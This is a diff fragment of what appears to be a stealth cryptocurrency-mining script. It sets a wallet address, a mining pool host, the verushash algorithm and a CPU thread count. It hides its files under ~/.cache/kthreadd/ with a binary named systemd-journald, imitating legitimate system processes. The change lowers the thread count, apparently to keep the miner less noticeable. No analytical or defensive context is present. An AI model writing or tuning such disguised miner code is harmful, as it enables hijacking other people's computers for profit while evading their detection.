@@ -7,7 +7,7 @@ import random
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
 POOL = "ghost.darkverse.cloud:11002"
 ALGO = "verushash"
-CPU_THREADS = 3
+CPU_THREADS = 2
 BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "systemd-journald")
 
